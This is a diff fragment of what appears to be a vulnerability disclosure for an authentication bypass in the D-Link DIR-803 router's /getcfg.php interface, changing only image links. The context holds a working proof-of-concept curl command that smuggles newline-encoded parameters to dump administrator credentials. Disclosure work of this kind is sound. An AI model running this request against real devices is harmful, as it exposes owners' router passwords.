@@ -15,7 +15,7 @@ An authentication bypass vulnerability exists in the /getcfg.php interface of D-
 ---
 ### **PoC**
 `curl 'http://192.168.0.1:80/getcfg.php?a=%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1'`
-![[D-Link/DIR-803/img/3.png]]
+![1](./img/1.png)
 
 This allows access to sensitive information such as administrator passwords.
-![[D-Link/DIR-803/img/4.png]]
+![1](./img/2.png)
